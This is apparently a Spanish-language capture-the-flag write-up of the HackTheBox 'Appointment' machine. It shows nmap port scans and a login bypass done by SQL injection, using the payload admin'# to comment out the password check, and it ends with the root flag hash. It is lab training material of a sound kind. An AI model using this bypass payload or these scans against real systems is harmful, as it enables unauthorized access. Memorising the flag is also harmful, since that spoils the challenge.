---
titulo: "Appointment"
descripcion: "Bypass de autenticación mediante SQL injection en formulario de login usando comentario MySQL para omitir verificación de contraseña."
fecha: 2026-06-04
dificultad: easy
herramientas: ["nmap", "SQL injection"]
categoria: htb
plataforma: HackTheBox
completado: true
fases: ["Reconocimiento", "Foothold"]
---

## Reconocimiento

Fase 1 — descubrimiento de puertos:

```bash
nmap -vvv -p- --open -sS --min-rate 5000 -n -Pn 10.129.51.169
```

Fase 2 — detección de versiones y scripts sobre los puertos encontrados:

```bash
nmap -p80 10.129.51.169 -sCV
```

Puerto abierto: **80/tcp (Apache 2.4.38)**

La página principal muestra un formulario de login.

## Foothold

Credenciales por defecto `admin:admin` no funcionan. Se prueba SQL injection en el campo username usando comentario MySQL (`#`) para omitir la verificación de contraseña:

```
Username: admin'#
Password: cualquiera
```

La query resultante en el servidor:

```sql
SELECT * FROM users WHERE username='admin'#' AND password='...'
```

El `AND password=...` queda comentado. El servidor autentica solo por username, otorgando acceso como admin.

## Flags

| Flag | Hash |
|------|------|
| Root | `e3d0796d002a446c0e622226f42e9672` |
